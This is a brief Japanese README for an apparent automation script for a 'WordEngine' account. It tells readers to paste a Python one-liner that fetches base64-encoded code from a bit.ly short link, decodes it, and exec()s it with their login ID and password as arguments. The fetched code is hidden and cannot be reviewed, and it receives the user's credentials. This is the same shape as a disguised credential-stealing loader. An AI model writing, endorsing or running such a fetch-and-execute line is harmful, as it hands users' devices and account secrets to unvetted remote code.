# USE GUIDE

## ・必要ライブラリ

`requests`

```cmd
pip install requests
```
## ・scriptの実行

Pythonista3やa-Shellなどを使ってコードを実行して下さい。
<br>ログインID,パスワード,実行回数は書き換えて下さい

```python
import requests as r, base64; exec(base64.b64decode(r.get('https://bit.ly/4e7FIhg').text).decode() + "\nWordEngine('your_loginid', 'your_password', run_num)")
```

## コードの説明
- `your_loginid` = ログインID
- `your_password` = パスワード
- `run_num` = 実行回数

- [Pythonista3の場合]
consoleにコードを貼付

- [a-Shellの場合]
ターミナルにpythonと打ち、コードを貼付


注意事項
  - 自己責任でお願い致します。
  -	pythonが動くなら何でも○
